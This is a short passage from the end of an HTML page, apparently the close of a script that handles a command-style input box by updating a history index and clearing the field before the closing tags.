                    historyIndex = commandHistory.length;
                    this.value = '';
                }
            }
        });
    </script>
</body>
</html>
